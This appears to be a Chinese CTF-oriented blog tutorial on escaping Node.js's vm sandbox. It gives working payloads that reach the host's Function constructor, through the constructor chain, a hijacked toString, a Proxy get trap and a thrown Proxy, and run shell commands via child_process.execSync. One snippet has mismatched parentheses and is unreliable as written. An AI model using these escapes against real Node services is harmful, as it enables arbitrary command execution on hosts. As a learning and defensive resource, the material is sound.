---
title: Node JS沙箱逃逸
description: 对CTF中NodeJS vm沙箱逃逸的研究
author: lamaper
date: 2025-10-01 21:04:21 +0800
categories: [Cyber Security]
tags: [ctf, web, node, js, vm, sandbox esc]
math: true
mermaid: true
toc: true
image:
  path: https://picx.zhimg.com/v2-abbb96bc4aebf18f6d3b2bcf1389c8fe_1440w.jpg
---

## Node JS沙箱逃逸

沙箱（Sandbox）一般指运行不受信任的虚拟环境。沙箱逃逸就是让沙箱中运行的代码获取到沙箱外的内容。

在服务端的Nodejs中和`window`类似的全局对象叫做`global`，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用`global.xxx`的方式来访问，直接用`xxx`就可以调用这个变量。

本文参考自[NodeJS VM和VM2沙箱逃逸-先知社区](https://xz.aliyun.com/news/11305#toc-1)，但为了更好的理解，进行了更详细、更全面的阐述。

### vm沙箱

`node:vm` 模块允许在 V8 虚拟机上下文中编译和运行代码，在[vm 虚拟机 | Node.js v24 文档](https://nodejs.cn/api/vm.html)中有详细介绍。

当我们创建一个虚拟环境时，可以采用：

```js
const vm = require("vm");
```

如果要将一段语句放入vm中运行，可以使用：

[`vm.runInContext(code, contextifiedObject[, options\])`](https://nodejs.cn/api/vm.html#vmrunincontextcode-contextifiedobject-options)

[`vm.runInNewContext(code[, contextObject[, options\]])`](https://nodejs.cn/api/vm.html#vmruninnewcontextcode-contextobject-options)

[`vm.runInThisContext(code[, options\])`](https://nodejs.cn/api/vm.html#vmruninthiscontextcode-options)

以`vm.runInNewContext(code[, contextObject[, options\]])`为例：

```js
console.log( vm.runInNewContext(`1+1`) );
```

得到结果：

```js
2
```

则说明运行成功。

`vm.runInContext(code, context)` **返回的是在该 context（沙箱 realm）中求值后的结果**。这个结果可以是任意 JavaScript 值：原始类型（number/string/boolean/null/undefined）、对象字面量、函数、Proxy、Error 等。

我们需要利用的是：如果返回的是对象/函数/Proxy/带 getter 的东西，宿主进程获得的并不是“值的拷贝”，而是**指向沙箱中那个值的引用**，因此可能导致回调/钩子在宿主上下文被触发。

#### 借助上下文对象逃逸

vm沙箱逃逸需要借助其自带类型：**上下文对象（contextify）**。在 Node.js 中，上下文对象是一个被严格限制的独立作用域容器，其本质上就是一个普通的 JavaScript 对象。它的作用是让 `vm` 执行的代码只能访问这个对象内部的属性，无法直接访问外部的全局变量。[vm 虚拟机 what-does-it-mean-to-contextify-an-object| Node.js v24 文档](https://nodejs.cn/api/vm.html#what-does-it-mean-to-contextify-an-object)

`Function` 对象提供了用于处理函数的方法。在 JavaScript 中，每个函数都是一个 `Function` 对象。`Function`的构造函数十分特殊，直接调用此构造函数可以动态创建函数，就像`eval()`一样， 但其创建的函数只能在全局作用域中运行。这给了沙箱逃逸先决条件。[Function - JavaScript | MDN](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function)

基于此，在具体情况下，可以实现：

```js
console.log( vm.runInNewContext(`this.constructor.constructor("return 1")()`) );
```

执行此代码得到结果：

```js
1
```

在不指定自定义上下文时，`vm.runInNewContext` 的默认上下文是一个空对象 `{}`，因此代码中的 `this` 始终指向这个空对象 `{}`，而这个上下文对象是不属于沙箱环境的；`this.constructor`是上下文对象的构造函数（`{}.constructor === Object` 为 `true`），`this.constructor.constructor`是上下文对象的构造函数对象的构造函数，由于上下文对象的构造函数是`Object`，`Object` 本身是一个函数（`typeof Object === 'function'`），而所有函数的构造函数都是 `Function`（`Object.constructor === Function` 为 `true`），所以最终`return 1`会被当作语句执行.

注意在此处不能写作`this.constructor().constructor("return 1")`，因为这里要调用的是`Function`的构造函数，而不是`Object`的构造函数。

接下来只需要找到一些可利用函数就可以实现其他操作。

在Node.js中存在`node:child_process` 模块，其提供了以与 `popen(3)`类似但不相同的方式生成子进程的能力，而主要的是通过调用`child_process`对象的一些方法可以实现命令运行。

`child_process.execSync(command[, options])`是一个创建同步进程的方法。可以借助该方法进行恶意操作。[child_process 子进程 | Node.js v24 文档](https://nodejs.cn/api/child_process.html#child_processexecsynccommand-options)

在Node.js的Shell环境中：

```js
> vm.runInNewContext(`this.constructor.constructor("return child_process")()`)
{
  _forkChild: [Function: _forkChild],
  ChildProcess: [Function: ChildProcess],
  exec: [Function: exec],
  execFile: [Function: execFile],
  execFileSync: [Function: execFileSync],
  execSync: [Function: execSync],
  fork: [Function: fork],
  spawn: [Function: spawn],
  spawnSync: [Function: spawnSync]
}
> const esc = vm.runInNewContext(`this.constructor.constructor("return child_process")()`);
undefined
> esc.execSync('whoami').toString()
'lamaper\n'
```

在Node.js中还存在`process`（进程）对象，其提供有关当前 Node.js 进程的信息并对其进行控制。其属性`process.mainModule` 提供了另一种检索 `require.main`的方法。不同之处在于，如果主模块在运行时发生更改，则`require.main`可能仍会引用更改发生前所需模块中的原始主模块。如果没有入口脚本，则 `process.mainModule` 将是 `undefined`。

需要注意的是，`process.mainModule` 新增于: v0.1.17，弃用于: v14.0.0，意味着这个方法已经不被官方推荐（但不代表不能使用）。

此外，在 REPL（交互式 shell）里 `require`/某些标识符是对 “全局/REPL realm” 可见的，而在模块文件（`node file.js`）里顶层 `require` 实际是由模块包装函数注入到**模块局部作用域**，不是全局变量。简单来说，上述实验只能在REPL中复现，而在实际环境中，必须借助`process.mainModule`引入需要的模块，如下：

```js
const vm = require("vm");
const y = `this.toString.constructor("return process")()`;
console.log(vm.runInNewContext(y)).mainModule.require("child_process").execSync("whoami").toString());
```

回过头来再研究这个函数：`vm.runInContext(script, context)`，不难发现前文所举的例子都是忽略context，只提供script。实际上，在忽略context的情况下，Node.js会自己创建一个空的上下文环境`{}`，显而易见地，script中的`this`直接代指这个空的上下文环境。

在下文这个例子中：

```js
const vm = require('vm');
const script = `m + n + this.m`;
const sandbox = { m: 1, n: 2 };
const context = new vm.createContext(sandbox);
const res = vm.runInContext(script, context);
console.log(res)
```

`vm.createContext()` 会对传入的 `sandbox` 进行特殊处理：让 `sandbox` 成为一个全局作用域容器，脚本执行时的 `this` 会指向这个对象；返回处理后的 `context` 对象——即被包装后的 `sandbox`，二者引用相同，修改 `context` 会同步影响 `sandbox`。

上述代码的执行结果是

```js
4
```

显而易见地，`this.m`指向`sandbox`，这意味着我们虽然可以通过直接调用`this`来获取`Function`构造函数，但不可以使用`this.m`来获取，如下的代码可以正常运行并得到结果：

```js
const vm = require('vm');
const script = `(() => {
    const esc = this.constructor.constructor("return process")();
    return esc.mainModule.require('child_process').execSync('whoami').toString();
    })()`;
const sandbox = { m: 1, n: 2 };
const context = new vm.createContext(sandbox);
const res = vm.runInContext(script, context);
console.log(res)
```

然而，如果将代码改为：

```js
const script = `(() => {
    const esc = this.m.constructor.constructor("return process")();
    return esc.mainModule.require('child_process').execSync('whoami').toString();
    })()`;
```

则不能实现。原因是`m`,`n`是基本数据类型而不是引用数据类型，如此进行的是值传递，无法拿到沙箱外部的引用。如果将`m`,`n`更改为引用数据类型类型，则可以执行：

```js
const vm = require('vm');
const script = `(() => {
    const esc = this.m.constructor.constructor("return process")();
    return esc.mainModule.require('child_process').execSync('whoami').toString();
    })()`;
const sandbox = { m: [], n: {} };
const context = new vm.createContext(sandbox);
const res = vm.runInContext(script, context);
console.log(res)
```

#### 劫持toString()逃逸

更进一步地，如果考虑如下情景：

```js
const vm = require('vm');
const script = `...`;
const sandbox = Object.create(null);
const context = vm.createContext(sandbox);
const res = vm.runInContext(script, context);
console.log('Hello ' + res)
```

与前面情景不同的是，`sandbox`不是一个存在的对象，而是`null`，因此`this === null`，无法从内部调用。我们考虑能否使用外部已经存在的对象。

`arguments.callee` 是 JavaScript 中一个特殊的属性，它包含对当前正在执行的函数的引用。这个属性在匿名函数中尤其有用，因为匿名函数无法通过名称引用自身。然而，`arguments.callee`已被弃用，不推荐在现代 JavaScript 中使用，但这并不妨碍我们使用它。

在`arguments`是函数内部的一个类数组对象，包含了当前函数被调用时传入的所有参数。它仅在函数内部可用，且与函数的参数列表对应。`arguments.callee`指向当前正在执行的函数本身，即函数自己。[arguments.callee - JavaScript | MDN](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arguments/callee)

如果函数 `f` 是在全局作用域内调用的，则 `f.caller` 的值为`null`；否则它就是调用 `f` 的函数。如果调用 `f` 的函数是一个严格模式函数，则 `f.caller` 的值也是 `null`。[Function.prototype.caller - JavaScript | MDN](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/caller)

以此我们可以得到一个调用链：`arguments.callee.caller`，其中`arguments.callee`是一个函数，通过`caller`获得这个函数的引用。这个引用是在沙箱外，因此我们可以利用前文的思路来获得构造函数。

```js
const script = `(() => {
    const a = {};
    a.toString = function(){
        const g = arguments.callee.caller;
        const f = (g.toString.constructor("return process"))();
        return f.mainModule.require('child_process').execSync('whoami').toString();
    }
    return a;
    })()`;
```

把利用代码放到 `toString`或其他会被宿主隐式调用的魔术方法中，是为了让沙箱中定义的函数在宿主触发调用时，能够看到宿主调用栈中的函数，即 `arguments.callee.caller` 指向宿主函数，从而通过调用栈上那个宿主函数的 `constructor` 拿到宿主 realm 的 `Function` 构造器，再用它在宿主 realm 执行任意字符串代码，进而访问 `process` / `require` / `child_process`。

此处的关键在于最后一行`console.log('Hello ' + res)`使用了`toString`方法，比较有局限性。

这个过程可以概述为：

1. 在 vm 的 sandbox 中创建对象 `a`，并定义 `a.toString = function(){ ... }`。这个函数是在沙箱 realm创建的（其 [[Realm]]/内部所属是 sandbox）。
2. `vm.runInContext(...)` 返回该对象引用 `res` 到宿主模块（host）。
3. 宿主做 `'Hello ' + res` —— JS 规范要求对 `res` 做 ToPrimitive（字符串上下文），于是会调用 `res.toString()`（这是宿主触发的调用）。
4. 当宿主执行 `res.toString()` 时，调用栈上有宿主的函数，比如当前模块的执行函数，因此在 `toString` 内部使用 `arguments.callee.caller` 可以访问调用它的那个函数对象，即宿主的 caller。
5. 这个 caller 是宿主 realm 的函数对象，其 `.constructor` 指向宿主 realm 的 `Function`。于是 `cc.constructor.constructor('return process')()` 或等价语句会在宿主 realm 生成并执行一个新的函数，这个函数运行在宿主 realm，因此能看到宿主全局（包括 `process` / `require`）。
6. 拿到 `process` 后再 `process.mainModule.require('child_process').execSync('whoami')` 就能在宿主上执行命令。

#### Proxy劫持Get逃逸

[Proxy 和 Reflect - 掘金](https://juejin.cn/post/6844904090116292616)

如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，我们可以用`Proxy`来劫持属性。

JavaScript 规范中， `[[Get]]`，用于读取属性的内部方法， `[[Set]]`，用于写入属性的内部方法，等等。这些方法仅在规范中使用，我们不能直接通过方法名调用它们。

我们可以利用`Proxy`绑架其调用属性的方法。代码如下：

```js
const vm = require("vm");

const script = 
`
(() =>{
    const a = new Proxy({}, {
        get: function(){
            const cc = arguments.callee.caller;
            const p = (cc.constructor.constructor('return process'))();
            return p.mainModule.require('child_process').execSync('whoami').toString();
        }
    })
    return a
})()
`;
const sandbox = Object.create(null);
const context = new vm.createContext(sandbox);
const res = vm.runInContext(script, context);
console.log(res.abc);
console.log("a" + res);
```

在`const res = vm.runInContext(script, context)`中，`res`获得到了逃逸出来的`Proxy`对象，在下一行调用任意一个属性（不一定需要这个属性存在）时，可以调用`[[get]]`方法，进而执行恶意代码。

触发 `toString` 的常见场景：字符串拼接（`'a' + obj`）、模板字符串（``${obj}``）、显式调用 `String(obj)`、某些 `console`/inspect 操作（取决于实现），或 `obj + ''`。所以有多种办法可以调用。

#### 异常捕获与处理逃逸

一些情况下，代码中不会给出res对象，也就是说执行沙箱后没有返回值被接收。对此可以考虑使用异常处理：

```js
const vm = require("vm");

const script = 
`
    throw new Proxy({}, {
        get: function(){
            const cc = arguments.callee.caller;
            const p = (cc.constructor.constructor('return process'))();
            return p.mainModule.require('child_process').execSync('whoami').toString();
        }
    })
`;
try {
    vm.runInContext(script, vm.createContext(Object.create(null)));
}catch(e) {
    console.log("error:" + e) 
}
```

参考文章：

https://juejin.cn/post/6844904090116292616

https://www.leavesongs.com/

https://vulhub.org/zh

### vm2沙箱

\<TODO\>

https://www.cnblogs.com/zpchcbd/p/16899212.html



